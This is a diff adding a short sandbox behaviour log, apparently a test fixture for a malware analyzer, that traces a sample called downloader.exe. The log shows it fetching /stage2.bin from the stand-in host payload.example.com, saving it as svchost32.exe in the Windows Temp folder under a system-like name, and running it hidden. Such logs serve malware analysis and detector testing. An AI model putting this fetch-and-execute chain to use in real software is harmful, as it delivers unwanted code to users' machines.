@@ -1,0 +1,29 @@
+# Log Creation Date: 06.03.2025 09:00:00
+# Analyzer Version: 2024.4.1
+# Flog Txt Version 1
+
+Process:
+id = "1"
+os_pid = "0x0500"
+os_parent_pid = "0x0004"
+parent_id = "0"
+image_name = "downloader.exe"
+filename = "c:\users\admin\downloader.exe"
+cmd_line = "downloader.exe"
+monitor_reason = "analysis_target"
+
+Region:
+id = "1"
+name = "private_0x0000000000010000"
+
+Thread:
+id = "1"
+os_tid = "0x0501"
+ [0001.000] InternetOpenA (lpszAgent="WinInet", dwAccessType=0x0, lpszProxyName=NULL, lpszProxyBypass=NULL, dwFlags=0x0) returned 0x4c0000
+ [0001.001] InternetConnectA (hInternet=0x4c0000, lpszServerName="payload.example.com", nServerPort=0x50, lpszUserName=NULL, lpszPassword=NULL, dwService=0x3, dwFlags=0x0, dwContext=0x0) returned 0x4c0004
+ [0001.002] HttpOpenRequestA (hConnect=0x4c0004, lpszVerb="GET", lpszObjectName="/stage2.bin", lpszVersion=NULL, lpszReferrer=NULL, dwFlags=0x84403100) returned 0x4c0008
+ [0001.003] HttpSendRequestA (hRequest=0x4c0008, lpszHeaders=NULL, dwHeadersLength=0x0, lpOptional=NULL, dwOptionalLength=0x0) returned 0x1
+ [0001.004] InternetReadFile (hFile=0x4c0008, lpBuffer=0x20000, dwNumberOfBytesToRead=0x10000, lpdwNumberOfBytesRead=0x30000) returned 0x1
+ [0001.005] CreateFileA (lpFileName="C:\Windows\Temp\svchost32.exe", dwDesiredAccess=0x40000000, dwShareMode=0x0, lpSecurityAttributes=NULL, dwCreationDisposition=0x2, dwFlagsAndAttributes=0x80, hTemplateFile=NULL) returned 0x60
+ [0001.006] WriteFile (hFile=0x60, lpBuffer=0x20000, nNumberOfBytesToWrite=0x10000, lpNumberOfBytesWritten=0x40000, lpOverlapped=NULL) returned 0x1
+ [0001.007] WinExec (lpCmdLine="C:\Windows\Temp\svchost32.exe", uCmdShow=0x0) returned 0x21
